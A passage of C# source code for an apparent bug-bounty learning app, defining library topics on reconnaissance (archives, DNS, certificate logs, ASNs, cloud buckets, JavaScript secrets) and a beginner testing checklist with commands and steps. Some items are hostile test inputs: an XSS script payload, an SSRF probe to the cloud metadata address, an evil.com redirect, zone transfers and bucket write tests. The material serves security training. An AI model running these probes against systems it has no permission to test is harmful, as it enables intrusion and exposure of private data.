            libraryTopics["Recon_Wayback"] = new LibraryTopic
            {
                Tag = "Recon_Wayback",
                Category = "Reconnaissance",
                Title = "Wayback Machine and Archives",
                Subtitle = "Discovering Historical Web Content",
                Content = "Web archives like the Wayback Machine preserve historical versions of websites. For bug hunters, archives reveal old URLs, endpoints, and parameters that may no longer be linked but are still functional, along with API endpoints and login pages that were previously exposed.\n\nWayback Machine Uses:\n1. Find old endpoints that are still active\n2. Discover previously exposed admin panels\n3. Find API endpoints no longer documented\n4. Access old configuration files\n5. See previous versions of login forms\n6. Discover subdomains that existed historically\n7. Find old JavaScript files with interesting endpoints\n\nWayback CDX API: The Wayback Machine provides an API (CDX API) for programmatically accessing archived URL data. You can query all URLs ever archived for a domain.\n\nCommon Web Archives: Wayback Machine (archive.org), CommonCrawl (commoncrawl.org), CachedView, Archive.today.\n\ngau (GetAllUrls): Tool that fetches all known URLs for a domain from Wayback Machine, OTX, and URLScan. Extremely useful for finding endpoints.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "waybackurls target.com | tee wayback_urls.txt", Explanation = "Fetch all archived URLs for domain from Wayback Machine." },
                    new CommandItem { Text = "gau target.com | tee all_urls.txt", Explanation = "GetAllUrls - fetch from Wayback, OTX, and URLScan simultaneously." },
                    new CommandItem { Text = "curl 'http://web.archive.org/cdx/search/cdx?url=*.target.com&output=text&fl=original&collapse=urlkey' | sort -u", Explanation = "CDX API query for all archived URLs including subdomains." },
                    new CommandItem { Text = "cat wayback_urls.txt | grep -E '\\.php|\\.asp|\\.aspx|\\.jsp' | sort -u", Explanation = "Filter wayback URLs for server-side script files." },
                    new CommandItem { Text = "cat wayback_urls.txt | grep '?' | sort -u", Explanation = "Extract URLs with parameters from archived URLs." },
                    new CommandItem { Text = "cat all_urls.txt | httpx -silent", Explanation = "Check which archived URLs are still live." },
                    new CommandItem { Text = "cat all_urls.txt | gf sqli | tee sqli_params.txt", Explanation = "Filter archived URLs for SQLi-prone parameters using gf patterns." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Gather all historical URLs", Code = "gau target.com > all_urls.txt" },
                    new StepItem { Number = 2, Description = "Filter for interesting endpoints", Code = "grep for /api/, /admin/, .php, etc." },
                    new StepItem { Number = 3, Description = "Check which URLs are still live", Code = "httpx or curl to verify" },
                    new StepItem { Number = 4, Description = "Extract and test parameters", Code = "Look for SQLi, XSS, SSRF params" },
                    new StepItem { Number = 5, Description = "Use gf patterns to find vulnerable parameter patterns", Code = "gf sqli, gf xss, gf ssrf" }
                },
                Tools = new List<string> { "gau", "waybackurls", "hakrawler", "gf", "httpx", "uro" }
            };

            libraryTopics["Recon_Asset"] = new LibraryTopic
            {
                Tag = "Recon_Asset",
                Category = "Reconnaissance",
                Title = "Asset Discovery Techniques",
                Subtitle = "Finding All Target Assets",
                Content = "Asset discovery is the process of finding all digital assets belonging to a target organization. This includes domains, subdomains, IP ranges, cloud resources, and third-party services. Thorough asset discovery maximizes your attack surface and increases the chance of finding bugs.\n\nAsset Categories:\n1. Domains and subdomains\n2. IP address ranges (ASN lookup)\n3. Cloud storage (S3 buckets, Azure Blob, GCS)\n4. Mobile applications (iOS App Store, Google Play)\n5. API endpoints\n6. Third-party services\n7. Code repositories\n8. Email and authentication infrastructure\n9. CDN assets\n10. IoT and network devices\n\nASN-Based Discovery: Companies own IP ranges (ASNs). By finding the target's ASN, you can discover all their IP ranges and scan them systematically. BGP.he.net, ipinfo.io, and whois provide ASN information.\n\nReverse IP Lookup: Finding other domains hosted on the same IP can reveal related infrastructure.\n\nShodan/Censys: Search engines for internet-connected devices. Can find target assets by organization name, SSL certificate, or hostname pattern.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "whois target.com | grep -i 'OrgID\\|netrange\\|ASN'", Explanation = "Find ASN and IP ranges from WHOIS data." },
                    new CommandItem { Text = "amass intel -org 'Target Company' -asn ASN12345", Explanation = "Amass Intel mode for organization-wide asset discovery." },
                    new CommandItem { Text = "shodan search 'ssl.cert.subject.CN:*.target.com'", Explanation = "Find target assets via SSL certificate in Shodan." },
                    new CommandItem { Text = "shodan search 'org:\"Target Company\" http.title:\"Admin\"'", Explanation = "Find admin panels of target in Shodan." },
                    new CommandItem { Text = "curl 'https://api.bgpview.io/search?query_term=target.com'", Explanation = "Find ASNs associated with target domain." },
                    new CommandItem { Text = "nmap -iL ip_ranges.txt --top-ports 1000 -T4", Explanation = "Scan discovered IP ranges for open services." },
                    new CommandItem { Text = "python3 S3Scanner.py -l s3_buckets.txt", Explanation = "Check for misconfigured S3 buckets." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find target ASN and IP ranges", Code = "amass intel -org 'Target Company'" },
                    new StepItem { Number = 2, Description = "Search Shodan for target assets", Code = "org:target.com or ssl.cert.subject.CN" },
                    new StepItem { Number = 3, Description = "Look for cloud storage buckets", Code = "target-name.s3.amazonaws.com" },
                    new StepItem { Number = 4, Description = "Find mobile apps on app stores", Code = "Search iOS/Android app stores" },
                    new StepItem { Number = 5, Description = "Scan discovered IP ranges", Code = "masscan on ASN IP ranges" }
                },
                Tools = new List<string> { "amass", "Shodan", "Censys", "FOFA", "bgp.he.net", "ipinfo.io", "S3Scanner" }
            };

            libraryTopics["Recon_Certs"] = new LibraryTopic
            {
                Tag = "Recon_Certs",
                Category = "Reconnaissance",
                Title = "Certificate Transparency Logs",
                Subtitle = "Subdomain Discovery via SSL Certificates",
                Content = "Certificate Transparency (CT) is a framework for publicly logging all SSL/TLS certificates. Certificate Authorities must submit every issued certificate to public CT logs. This means every certificate ever issued for any subdomain of your target is publicly recorded.\n\nWhy CT Logs are Valuable: When a company creates a new subdomain and gets an SSL certificate, it's logged in CT. Even if the subdomain is not publicly linked anywhere, it appears in CT logs. This makes CT logs an excellent source for subdomain discovery.\n\nMajor CT Log Sources:\n1. crt.sh - Free, easy to use, aggregates multiple logs\n2. Censys - Commercial but has free tier\n3. Google's Transparency Report\n4. Facebook's Certificate Transparency\n\nSearching CT Logs: The crt.sh website allows searching by domain. The wildcard search %.target.com finds all subdomains. The API returns JSON data that can be parsed programmatically.\n\nHistorical Data: CT logs contain historical data. You can find subdomains that had certificates issued years ago, revealing infrastructure that may no longer be actively maintained.\n\nOrganization Certificates: You can search by organization name to find all certificates issued to a company, revealing all their domains not just subdomains.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl -s 'https://crt.sh/?q=%.target.com&output=json' | jq -r '.[].name_value' | sort -u", Explanation = "Query crt.sh API for all subdomains with certificates." },
                    new CommandItem { Text = "curl -s 'https://crt.sh/?q=target.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u", Explanation = "Remove wildcard prefixes from CT results." },
                    new CommandItem { Text = "python3 ct-exposer.py -d target.com", Explanation = "CT log enumeration with ctfr or ct-exposer." },
                    new CommandItem { Text = "python3 ctfr.py -d target.com -o ct_subs.txt", Explanation = "CTFR tool specifically for CT log subdomain enumeration." },
                    new CommandItem { Text = "censys search 'parsed.names: target.com' --fields 'parsed.names'", Explanation = "Censys CT log search (requires API key)." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Query crt.sh for target domain", Code = "curl 'https://crt.sh/?q=%.target.com&output=json' | jq '.[].name_value'" },
                    new StepItem { Number = 2, Description = "Parse and deduplicate results", Code = "sort -u, remove wildcards" },
                    new StepItem { Number = 3, Description = "Add results to subdomain list", Code = "cat ct_subs.txt >> all_subs.txt" },
                    new StepItem { Number = 4, Description = "Search by organization name for all domains", Code = "crt.sh?o=Target+Company" }
                },
                Tools = new List<string> { "crt.sh", "ctfr", "ct-exposer", "Censys", "subfinder" }
            };

            libraryTopics["Recon_DNS"] = new LibraryTopic
            {
                Tag = "Recon_DNS",
                Category = "Reconnaissance",
                Title = "DNS Enumeration Methods",
                Subtitle = "Complete DNS Reconnaissance Techniques",
                Content = "DNS reconnaissance extracts maximum information from the Domain Name System about a target. Thorough DNS enumeration reveals infrastructure, email systems, technology choices, and attack vectors.\n\nDNS Record Types to Enumerate:\nA: IPv4 addresses\nAAAA: IPv6 addresses\nMX: Mail servers\nNS: Name servers\nTXT: Verification records, SPF, DKIM\nSOA: Zone authority info\nCNAME: Aliases\nSRV: Service records\nCAA: Certificate Authority Authorization\nPTR: Reverse DNS\n\nDNS Brute Force: Use wordlists to discover subdomains not found through passive means. Start with common subdomain wordlists, then add target-specific terms.\n\nDNS Zone Transfer: If misconfigured, a zone transfer (AXFR query) dumps all DNS records. Rare but valuable when found.\n\nDNS Wildcard Detection: Some domains have wildcard (*) DNS records. Before brute forcing, detect if wildcard is active by querying a random subdomain.\n\nDNS History: Tools like SecurityTrails show historical DNS records. Useful for finding IP addresses that have changed or previously exposed infrastructure.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "dig target.com ANY +noall +answer", Explanation = "Query all DNS record types." },
                    new CommandItem { Text = "for ns in $(dig +short target.com NS); do dig @$ns target.com AXFR; done", Explanation = "Attempt zone transfer against all name servers." },
                    new CommandItem { Text = "dnsrecon -d target.com -t axfr", Explanation = "DNSRecon zone transfer attempt." },
                    new CommandItem { Text = "dnsrecon -d target.com -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", Explanation = "DNS brute force with SecLists wordlist." },
                    new CommandItem { Text = "massdns -r resolvers.txt -t A -o S subdomains.txt", Explanation = "Fast mass DNS resolution using massdns." },
                    new CommandItem { Text = "dnsx -l subdomains.txt -a -aaaa -cname -mx -ns -txt -resp", Explanation = "Resolve multiple record types for subdomain list." },
                    new CommandItem { Text = "dig target.com TXT | grep -i 'spf\\|dkim\\|dmarc'", Explanation = "Find email security records." },
                    new CommandItem { Text = "dig +short randomXXXXX.target.com A", Explanation = "Test for wildcard DNS by querying random subdomain." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Enumerate all DNS record types", Code = "dig target.com ANY" },
                    new StepItem { Number = 2, Description = "Attempt zone transfer", Code = "dig @ns1.target.com target.com AXFR" },
                    new StepItem { Number = 3, Description = "Check for wildcard DNS", Code = "dig random12345.target.com" },
                    new StepItem { Number = 4, Description = "Brute force subdomains", Code = "dnsrecon -t brt -D wordlist.txt" },
                    new StepItem { Number = 5, Description = "Review email records for security issues", Code = "dig target.com TXT for SPF" }
                },
                Tools = new List<string> { "dig", "dnsrecon", "massdns", "dnsx", "fierce", "dnsmap" }
            };

            libraryTopics["Recon_Email"] = new LibraryTopic
            {
                Tag = "Recon_Email",
                Category = "Reconnaissance",
                Title = "Email Harvesting Techniques",
                Subtitle = "Finding Target Employee Emails",
                Content = "Email harvesting collects email addresses associated with a target organization. While not directly used in web bug bounty, emails reveal employee names, internal account formats, and can be used to test authentication systems.\n\nWhy Harvest Emails: Discovering employee email formats (firstname.lastname@target.com) helps in testing authentication, finding valid usernames, understanding organizational structure, and potentially discovering associated accounts on other platforms.\n\nEmail Sources:\n1. Hunter.io - Dedicated email finding service\n2. theHarvester - Multi-source email and subdomain finder\n3. LinkedIn - Employee profiles with email addresses\n4. GitHub - Developer emails in commits\n5. Breach databases - Previously leaked emails\n6. Google dorking (site:target.com filetype:pdf)\n7. WHOIS records for registration emails\n\nEmail Format Discovery: Once you have a few emails, you can determine the format. John Smith might be j.smith@, jsmith@, john.smith@, or smith.john@. Hunter.io provides format detection.\n\nBug Bounty Uses: Test login forms with discovered emails to check for account enumeration. Test password reset with discovered emails. Verify if business email accounts are being used for sign-ups.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "theHarvester -d target.com -b all", Explanation = "Multi-source email and subdomain harvesting." },
                    new CommandItem { Text = "theHarvester -d target.com -b google,bing,linkedin", Explanation = "Target specific sources for email harvesting." },
                    new CommandItem { Text = "hunter.io API: curl 'https://api.hunter.io/v2/domain-search?domain=target.com&api_key=KEY'", Explanation = "Hunter.io API for email discovery." },
                    new CommandItem { Text = "git log --all --format='%ae' | sort -u", Explanation = "Extract developer emails from git commit history." },
                    new CommandItem { Text = "site:target.com filetype:pdf email", Explanation = "Google dork to find emails in PDFs on target." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Run theHarvester against target domain", Code = "theHarvester -d target.com -b all" },
                    new StepItem { Number = 2, Description = "Use Hunter.io to verify email format", Code = "hunter.io domain search" },
                    new StepItem { Number = 3, Description = "Search LinkedIn for employees", Code = "Note job titles and email format" },
                    new StepItem { Number = 4, Description = "Check git commits for developer emails", Code = "git log --format='%ae'" },
                    new StepItem { Number = 5, Description = "Use emails to test authentication", Code = "Test account enumeration on login forms" }
                },
                Tools = new List<string> { "theHarvester", "Hunter.io", "Snov.io", "Clearbit", "Phonebook.cz" }
            };

            libraryTopics["Recon_Whois"] = new LibraryTopic
            {
                Tag = "Recon_Whois",
                Category = "Reconnaissance",
                Title = "WHOIS and DNS History",
                Subtitle = "Domain Registration Research",
                Content = "WHOIS records contain domain registration information and DNS history reveals infrastructure changes over time. Both provide valuable context for understanding target infrastructure.\n\nWHOIS Information: Domain registrar, registration and expiry dates, registrant contact (often redacted with privacy), name servers, administrative and technical contacts.\n\nBug Bounty Uses of WHOIS:\n1. Finding related domains registered by same entity\n2. Discovering real IP addresses before CDN\n3. Finding registrant emails for social engineering research\n4. Identifying the target's hosting providers\n5. Finding domains registered with same email (reverse WHOIS)\n\nDNS History: Services like SecurityTrails, PassiveTotal, and DomainTools show historical DNS records. This reveals:\n- IP addresses used before Cloudflare was added (origin server)\n- Subdomains that existed previously\n- Name server changes (may indicate migrations)\n- Historical MX records\n\nReverse WHOIS: Find all domains registered with the same email or organization. Reveals the full scope of the target's domain portfolio.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "whois target.com", Explanation = "Basic WHOIS lookup for domain registration info." },
                    new CommandItem { Text = "whois 1.2.3.4", Explanation = "WHOIS for IP address. Shows who owns the IP block." },
                    new CommandItem { Text = "curl 'https://api.securitytrails.com/v1/history/target.com/dns/a' -H 'APIKEY: KEY'", Explanation = "SecurityTrails historical A records via API." },
                    new CommandItem { Text = "curl 'https://api.whoisxmlapi.com/v1?apiKey=KEY&domainName=target.com'", Explanation = "WHOIS API for programmatic access." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Run WHOIS on target domain", Code = "whois target.com" },
                    new StepItem { Number = 2, Description = "Check DNS history for origin IP", Code = "SecurityTrails historical DNS" },
                    new StepItem { Number = 3, Description = "Reverse WHOIS to find related domains", Code = "Search by organization or registrant email" },
                    new StepItem { Number = 4, Description = "Try connecting to historical IPs directly", Code = "May bypass CDN to reach origin" }
                },
                Tools = new List<string> { "whois", "SecurityTrails", "DomainTools", "PassiveTotal", "ViewDNS" }
            };

            libraryTopics["Recon_ASN"] = new LibraryTopic
            {
                Tag = "Recon_ASN",
                Category = "Reconnaissance",
                Title = "ASN and IP Range Discovery",
                Subtitle = "Mapping Target Network Infrastructure",
                Content = "Autonomous System Numbers (ASNs) identify networks on the internet. Large organizations own their own ASNs and IP ranges. Discovering a target's ASN allows you to find all IP addresses they own, expanding the attack surface significantly.\n\nWhat is an ASN: An Autonomous System (AS) is a network or collection of networks controlled by a single organization with a unified routing policy. Each AS is identified by an ASN. ISPs, large enterprises, and cloud providers typically have their own ASNs.\n\nFinding Target ASN: Use WHOIS, BGP looking glasses, or services like bgp.he.net to find the ASN for a target's IP or organization name.\n\nIP Range Enumeration: Once you have the ASN, you can get all IP prefixes assigned to it. These prefixes represent IP ranges you can scan within scope (if the program allows).\n\nBug Bounty Relevance: Programs with broad scope (*.target.com plus their IP ranges) allow scanning ASN-owned IPs. This can find internal services, development environments, and unpatched systems that expose the target's true attack surface.\n\nCloud vs Own ASN: Many companies use cloud providers (AWS, GCP, Azure) which have their own ASNs. Assets on cloud are identified by cloud provider metadata, not company ASN.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "whois -h whois.radb.net -- '-i origin AS12345'", Explanation = "Find IP prefixes for an ASN." },
                    new CommandItem { Text = "curl 'https://api.bgpview.io/asn/AS12345/prefixes'", Explanation = "BGPView API to get all IP prefixes for ASN." },
                    new CommandItem { Text = "amass intel -asn 12345", Explanation = "Amass Intel mode to enumerate assets from ASN." },
                    new CommandItem { Text = "curl 'https://ipinfo.io/AS12345' -H 'Accept: application/json'", Explanation = "IPInfo API for ASN information and IP ranges." },
                    new CommandItem { Text = "masscan -iL ip_ranges.txt -p 80,443,8080,8443 --rate=1000", Explanation = "Scan discovered IP ranges for web services." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find target ASN", Code = "whois target_ip or bgp.he.net" },
                    new StepItem { Number = 2, Description = "Get all IP prefixes for ASN", Code = "api.bgpview.io/asn/ASNUMBER/prefixes" },
                    new StepItem { Number = 3, Description = "Scan IP ranges for services", Code = "masscan on discovered IP ranges" },
                    new StepItem { Number = 4, Description = "Identify interesting services", Code = "Web servers on non-standard ports" }
                },
                Tools = new List<string> { "amass", "bgp.he.net", "BGPView", "ipinfo.io", "masscan" }
            };

            libraryTopics["Recon_Cloud"] = new LibraryTopic
            {
                Tag = "Recon_Cloud",
                Category = "Reconnaissance",
                Title = "Cloud Bucket Discovery",
                Subtitle = "Finding Misconfigured Cloud Storage",
                Content = "Cloud storage services like Amazon S3, Google Cloud Storage, and Azure Blob Storage are commonly misconfigured to allow public access. Exposed buckets can contain sensitive data, backups, and application files.\n\nWhy Buckets Get Exposed: Developers configure buckets as public for legitimate reasons (hosting static files) but accidentally include sensitive data. Legacy configurations from before default-private settings. Misunderstanding of bucket policies.\n\nBucket Naming Patterns: Buckets are often named after the organization. Common patterns: target.com, target-com, targetcom, target-backup, target-dev, target-staging, target-assets, target-data.\n\nCloud Providers:\nAWS S3: https://target.s3.amazonaws.com or https://s3.amazonaws.com/target\nGoogle Cloud: https://storage.googleapis.com/target\nAzure Blob: https://target.blob.core.windows.net/\nDigitalOcean Spaces: https://target.nyc3.digitaloceanspaces.com\n\nWhat to Find in Buckets: Database backups, application source code, API keys and configuration files, user data exports, internal documentation, logs with PII.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "aws s3 ls s3://target-company --no-sign-request", Explanation = "List public S3 bucket without authentication." },
                    new CommandItem { Text = "curl https://target.s3.amazonaws.com/", Explanation = "Test if S3 bucket is publicly accessible." },
                    new CommandItem { Text = "python3 s3scanner.py --bucket target-company", Explanation = "S3Scanner tool for automated bucket testing." },
                    new CommandItem { Text = "python3 GCPBucketBrute.py -k target -p target.com", Explanation = "Enumerate Google Cloud Storage buckets." },
                    new CommandItem { Text = "python3 lazys3.py target", Explanation = "Enumerate common S3 bucket names for a target." },
                    new CommandItem { Text = "subfinder -d target.com | grep -i 's3\\|blob\\|storage\\|bucket'", Explanation = "Find cloud storage subdomains via subdomain enumeration." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Generate bucket name permutations", Code = "target, target-backup, target-dev, target.com" },
                    new StepItem { Number = 2, Description = "Test AWS S3 buckets", Code = "aws s3 ls s3://bucketname --no-sign-request" },
                    new StepItem { Number = 3, Description = "Test GCP and Azure buckets", Code = "curl storage.googleapis.com/bucketname" },
                    new StepItem { Number = 4, Description = "Check what's accessible", Code = "List bucket contents if publicly readable" },
                    new StepItem { Number = 5, Description = "Test for write access too", Code = "aws s3 cp testfile.txt s3://bucketname" }
                },
                Tools = new List<string> { "S3Scanner", "lazys3", "GCPBucketBrute", "bucket-finder", "aws cli" }
            };

            libraryTopics["Recon_JS"] = new LibraryTopic
            {
                Tag = "Recon_JS",
                Category = "Reconnaissance",
                Title = "JavaScript File Analysis",
                Subtitle = "Extracting Intelligence from JavaScript",
                Content = "JavaScript files are often overlooked goldmines during recon. Modern web applications put significant logic in JavaScript, including API endpoints, authentication flows, hardcoded secrets, and internal paths.\n\nWhat JavaScript Files Reveal:\n1. API endpoints not visible in UI\n2. Hardcoded API keys and tokens\n3. Internal domain names and IPs\n4. Application structure and logic\n5. Authentication bypass opportunities\n6. Debug functionality\n7. Developer comments with sensitive info\n8. Environment variables accidentally included\n9. Third-party service integrations\n\nFinding JavaScript Files: Browser DevTools Network tab, directory fuzzing for .js files, Wayback Machine for historical JS files, crawling.\n\nAnalysis Tools: LinkFinder extracts endpoints from JS. SecretFinder finds API keys. Regex patterns for common secret formats.\n\nBundle Analysis: Modern apps use webpack or similar bundlers. Bundles may contain source maps (.js.map) revealing original source code. Source maps can dramatically simplify analysis.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "python3 LinkFinder.py -i https://target.com/app.js -o cli", Explanation = "Extract all endpoints and URLs from JavaScript file." },
                    new CommandItem { Text = "python3 SecretFinder.py -i https://target.com/app.js -o cli", Explanation = "Find API keys and secrets in JavaScript files." },
                    new CommandItem { Text = "gau target.com | grep '\\.js$' | sort -u", Explanation = "Find all JavaScript files via Wayback Machine." },
                    new CommandItem { Text = "curl https://target.com/app.js | grep -oP '(?<=/api/)[a-zA-Z/]+'", Explanation = "Extract API paths from JavaScript using grep." },
                    new CommandItem { Text = "curl https://target.com/app.js | grep -E '(api_key|apikey|access_token|secret).*[\"\\']\\w{20,}'", Explanation = "Search for common secret patterns in JavaScript." },
                    new CommandItem { Text = "cat js_files.txt | xargs -I{} python3 SecretFinder.py -i {} -o cli", Explanation = "Run SecretFinder against multiple JavaScript files." },
                    new CommandItem { Text = "curl https://target.com/app.js.map 2>/dev/null | head -100", Explanation = "Check for source maps that reveal original source code." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Find all JavaScript files on target", Code = "gau + ffuf for js files" },
                    new StepItem { Number = 2, Description = "Run LinkFinder to extract endpoints", Code = "LinkFinder.py -i url -o cli" },
                    new StepItem { Number = 3, Description = "Run SecretFinder to find credentials", Code = "SecretFinder.py -i url -o cli" },
                    new StepItem { Number = 4, Description = "Manually review interesting JS files", Code = "Use browser DevTools, beautify minified code" },
                    new StepItem { Number = 5, Description = "Check for source map files", Code = "curl target.com/app.js.map" },
                    new StepItem { Number = 6, Description = "Test discovered API endpoints", Code = "Try each extracted endpoint" }
                },
                Tools = new List<string> { "LinkFinder", "SecretFinder", "JSFinder", "relative-url-extractor", "gau" }
            };
        }

        
        private void InitializeFirstBug()
        {
            libraryTopics["First_Recon"] = new LibraryTopic
            {
                Tag = "First_Recon",
                Category = "Finding Your First Bug",
                Title = "Complete Recon Methodology",
                Subtitle = "Step-by-Step Recon for Bug Bounty",
                Content = "Having a systematic recon methodology is what separates consistent bug finders from those who get lucky occasionally. A good methodology ensures you don't miss anything and makes your process repeatable and improvable.\n\nPhase 1 - Passive Recon (no target interaction): Subdomain enumeration via CT logs, passive DNS tools, GitHub search for secrets, Wayback Machine historical URLs, WHOIS and ASN research, Shodan/Censys asset discovery.\n\nPhase 2 - Active Recon (direct target interaction): DNS brute forcing, port scanning, web crawling, directory fuzzing, JavaScript analysis, technology fingerprinting.\n\nPhase 3 - Vulnerability Mapping: For each discovered endpoint and service, map potential vulnerability classes. API endpoints → IDOR, injection. Login forms → auth bypass, SQLi. File uploads → RCE, XSS. Redirects → open redirect, SSRF.\n\nPhase 4 - Exploitation: Systematically test each potential vulnerability, document findings, and prioritize by impact.\n\nKeeping Notes: Document everything. Targets you've tested, what you found, what tools you ran. Good notes save hours of repeated work.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "subfinder -d target.com -all -o subs.txt", Explanation = "Step 1: Passive subdomain enumeration." },
                    new CommandItem { Text = "cat subs.txt | httpx -silent -o live.txt", Explanation = "Step 2: Filter live subdomains." },
                    new CommandItem { Text = "cat live.txt | aquatone -out screenshots/", Explanation = "Step 3: Screenshot all live targets." },
                    new CommandItem { Text = "gau target.com | tee urls.txt", Explanation = "Step 4: Collect all historical URLs." },
                    new CommandItem { Text = "cat live.txt | nuclei -t ~/nuclei-templates/ -o nuclei_results.txt", Explanation = "Step 5: Automated vulnerability scanning." },
                    new CommandItem { Text = "ffuf -u https://target.com/FUZZ -w wordlist.txt -o dirs.txt", Explanation = "Step 6: Directory fuzzing on interesting targets." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Passive subdomain enumeration", Code = "subfinder + amass + assetfinder + crt.sh" },
                    new StepItem { Number = 2, Description = "Filter live subdomains", Code = "httpx -silent" },
                    new StepItem { Number = 3, Description = "Screenshot live subdomains", Code = "aquatone" },
                    new StepItem { Number = 4, Description = "Port scanning on interesting hosts", Code = "nmap -sV --top-ports 1000" },
                    new StepItem { Number = 5, Description = "Historical URL discovery", Code = "gau, waybackurls" },
                    new StepItem { Number = 6, Description = "JavaScript file analysis", Code = "LinkFinder, SecretFinder" },
                    new StepItem { Number = 7, Description = "Automated scanning with nuclei", Code = "nuclei -t nuclei-templates/" },
                    new StepItem { Number = 8, Description = "Directory fuzzing on interesting targets", Code = "ffuf with good wordlists" },
                    new StepItem { Number = 9, Description = "Manual testing on promising endpoints", Code = "Burp Suite deep testing" }
                },
                Tools = new List<string> { "subfinder", "httpx", "aquatone", "nmap", "gau", "nuclei", "ffuf", "Burp Suite", "LinkFinder" }
            };

            libraryTopics["First_Checklist"] = new LibraryTopic
            {
                Tag = "First_Checklist",
                Category = "Finding Your First Bug",
                Title = "Ultimate Testing Checklist",
                Subtitle = "Comprehensive Vulnerability Testing Checklist",
                Content = "A thorough testing checklist ensures you systematically check for all common vulnerabilities. Checking every item for each target maximizes your chances of finding valid bugs.\n\nAuthentication Testing: Default credentials, account enumeration, brute force (no lockout), password reset flaws, MFA bypass, session fixation, insecure remember-me.\n\nAuthorization Testing: IDOR in all endpoints, horizontal privilege escalation, vertical privilege escalation, function-level access control, API endpoint authorization.\n\nInput Validation Testing: SQL injection in all parameters, XSS in all input fields, Command injection in system-interacting features, SSRF in URL parameters, Open redirect in redirect parameters, XXE in XML endpoints, SSTI in template rendering.\n\nSession Management: Cookie security flags (HttpOnly, Secure, SameSite), session timeout, session regeneration after login, session invalidation on logout.\n\nInformation Disclosure: Error messages, debug information, server version headers, directory listing, backup files, sensitive data in source code.\n\nBusiness Logic: Skip workflow steps, negative values in financial operations, coupon abuse, race conditions in single-use features.",
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Authentication: Test login form for brute force protection", Code = "Send 20 failed attempts, check if locked" },
                    new StepItem { Number = 2, Description = "Authentication: Test password reset for token flaws", Code = "Check expiry, reusability, predictability" },
                    new StepItem { Number = 3, Description = "Authorization: Test IDOR on all object IDs", Code = "Create two accounts, cross-access resources" },
                    new StepItem { Number = 4, Description = "Input: Test SQLi on all parameters", Code = "Add single quote to all inputs" },
                    new StepItem { Number = 5, Description = "Input: Test XSS on all reflected inputs", Code = "<script>alert(1)</script> in all fields" },
                    new StepItem { Number = 6, Description = "Input: Test SSRF in URL parameters", Code = "http://169.254.169.254/ in url= params" },
                    new StepItem { Number = 7, Description = "Session: Check cookie flags", Code = "curl -v | grep Set-Cookie" },
                    new StepItem { Number = 8, Description = "Info: Check security headers", Code = "curl -I target.com" },
                    new StepItem { Number = 9, Description = "Info: Check for sensitive files", Code = "/.git, /.env, /robots.txt, sitemap.xml" },
                    new StepItem { Number = 10, Description = "Logic: Test for CSRF on state-changing actions", Code = "Remove CSRF token, see if action succeeds" }
                },
                Tools = new List<string> { "Burp Suite", "Autorize", "Param Miner", "nuclei" }
            };

            libraryTopics["First_LowHanging"] = new LibraryTopic
            {
                Tag = "First_LowHanging",
                Category = "Finding Your First Bug",
                Title = "Low-Hanging Fruits Encyclopedia",
                Subtitle = "Easy-to-Find Vulnerabilities for Beginners",
                Content = "Low-hanging fruit vulnerabilities are those that are easy to find, require minimal skill, and are commonly missed. For beginners, focusing on these first builds confidence and initial reputation.\n\nTop Low-Hanging Fruits:\n\n1. Missing Security Headers: CSP, X-Frame-Options, HSTS, X-Content-Type-Options. Easy to check, report quickly. Usually low-medium severity.\n\n2. Open Redirect: Parameters like redirect=, url=, next=, return= with external URLs. Easy to test manually.\n\n3. Exposed .git Directory: Check /.git/HEAD. If accessible, can reveal source code.\n\n4. Default Credentials: admin/admin, admin/password on admin panels. WhatWeb + Hydra.\n\n5. Username Enumeration: Different responses for valid vs invalid usernames on login/reset.\n\n6. Sensitive Data in Cookies: JWT tokens without HttpOnly, session tokens readable by JS.\n\n7. Insecure Direct Object References: Changing numeric IDs in URLs and API calls.\n\n8. Email Verification Bypass: Skip email verification to access accounts.\n\n9. Rate Limiting Missing: No limit on login, registration, password reset.\n\n10. Subdomain Takeover: CNAME pointing to unclaimed third-party service.",
                Commands = new List<CommandItem>
                {
                    new CommandItem { Text = "curl -I https://target.com | grep -E 'X-Frame|X-Content|CSP|HSTS|Referrer'", Explanation = "Check for missing security headers quickly." },
                    new CommandItem { Text = "curl https://target.com/.git/HEAD", Explanation = "Check if .git directory is exposed." },
                    new CommandItem { Text = "curl 'https://target.com/redirect?url=https://evil.com'", Explanation = "Test for open redirect." },
                    new CommandItem { Text = "subzy run --targets live_subs.txt", Explanation = "Check for subdomain takeover vulnerabilities." },
                    new CommandItem { Text = "nuclei -u https://target.com -t nuclei-templates/ -severity low,medium", Explanation = "Automated scan for common low-hanging fruit." }
                },
                Steps = new List<StepItem>
                {
                    new StepItem { Number = 1, Description = "Check security headers on all endpoints", Code = "curl -I https://target.com" },
                    new StepItem { Number = 2, Description = "Test all redirect parameters", Code = "redirect=, url=, next=, return=" },
                    new StepItem { Number = 3, Description = "Check for exposed sensitive files", Code = "/.git, /.env, /backup, /phpinfo.php" },
                    new StepItem { Number = 4, Description = "Test for username enumeration", Code = "Compare responses for valid/invalid usernames" },
                    new StepItem { Number = 5, Description = "Check all subdomains for takeover", Code = "subzy on full subdomain list" },
